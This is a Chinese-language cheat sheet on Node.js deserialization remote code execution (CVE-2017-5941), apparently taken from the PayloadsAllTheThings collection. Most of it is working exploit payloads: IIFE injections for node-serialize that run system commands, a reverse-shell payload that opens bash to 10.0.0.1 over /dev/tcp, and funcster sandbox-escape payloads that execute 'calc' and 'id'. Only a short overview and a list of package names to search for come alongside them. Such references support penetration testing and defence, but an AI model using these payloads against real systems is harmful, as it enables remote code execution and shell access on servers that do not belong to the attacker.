# Node.js Deserialization - Node.js反序列化漏洞

[SEARCH_KEYWORDS]
漏洞类型: Deserialization Node.js 反序列化 RCE
攻击类型: Remote Code Execution Arbitrary Code Execution
关键词: node-serialize funcster serialize-to-js unserialize IIFE
技术: IIFE Immediately Invoked Function Expression RCE Gadget
CVE: CVE-2017-5941
库: node-serialize funcster serialize-to-js

[CONTENT]

## Node.js反序列化概述

Node.js反序列化是指从序列化格式(如JSON、BSON)重建JavaScript对象的过程。当不可信数据传递给反序列化函数时，可能导致任意代码执行。

## 检测方法

在Node.js源代码中查找以下关键字:
- `node-serialize`
- `serialize-to-js`
- `funcster`

## node-serialize漏洞

CVE-2017-5941: node-serialize包0.0.4版本存在漏洞，通过IIFE可实现任意代码执行。

### 生成Payload

```js
var y = {
    rce : function(){
        require('child_process').exec('ls /', function(error,
        stdout, stderr) { console.log(stdout) });
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

### 添加括号强制执行

在函数末尾添加`()`:

```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}
```

### 反弹Shell Payload

```js
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1', function(error,stdout, stderr) { console.log(stdout) });}()"}
```

## funcster漏洞

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```

### Linux命令执行

```js
{"rce":{"__js_function":"function(){const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)});}()"}}
```

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/Node.md